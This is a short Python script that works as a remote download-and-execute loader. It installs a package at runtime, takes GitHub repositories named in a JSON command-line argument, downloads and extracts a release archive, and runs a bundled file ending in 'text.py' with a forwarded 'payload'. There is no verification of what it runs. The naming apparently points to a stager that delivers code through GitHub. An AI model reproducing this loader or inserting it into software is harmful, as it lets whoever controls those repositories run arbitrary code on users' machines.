import sys, subprocess, os, zipfile,json
packages = ['requests']
subprocess.check_call([sys.executable, '-m', 'pip', 'install'] + packages)
import requests

filename="latest_release.zip"

def download_latest(user, repo, fallback_tag, output="latest_release.zip"):
    # --- 1. Try API for Latest Version ---
    try:
        print("Checking API for latest release...")
        api_url = f"https://api.github.com/repos/{user}/{repo}/releases/latest"
        resp = requests.get(api_url)
        resp.raise_for_status()
        
        data = resp.json()
        download_url = data['zipball_url'] # Gets source code zip for latest
        
    except Exception as e:
        # --- 2. Fallback to specific tag if API fails ---
        download_url = f"https://github.com/{user}/{repo}/archive/refs/tags/{fallback_tag}.zip"

    # --- 3. Download ---
    with requests.get(download_url, stream=True) as r:
        r.raise_for_status()
        with open(output, 'wb') as f:
            for chunk in r.iter_content(chunk_size=8192):
                f.write(chunk)

payload = json.loads(sys.argv[1])
data1 = payload["data1"]
targets = [tuple(x) for x in data1]
pass_payload= payload["data"]

for user, repo, tag in targets:
    # Check if file exists before calling
    if not os.path.exists(filename):
        download_latest(user, repo, tag, output=filename)
    else:
        break

if os.path.exists(filename):
    with zipfile.ZipFile(filename, 'r') as z:
        z.extractall("extracted")
        test_file = [f for f in z.namelist() if f.endswith("text.py")]

        if test_file:
            script_path = os.path.join("extracted", test_file[0])
            script_dir = os.path.dirname(script_path)
            subprocess.run([sys.executable, os.path.basename(script_path),json.dumps(pass_payload)], cwd=script_dir)
        else:
            print("not found inside the zip.")
else:
    print(" not found. Nothing to extract.")
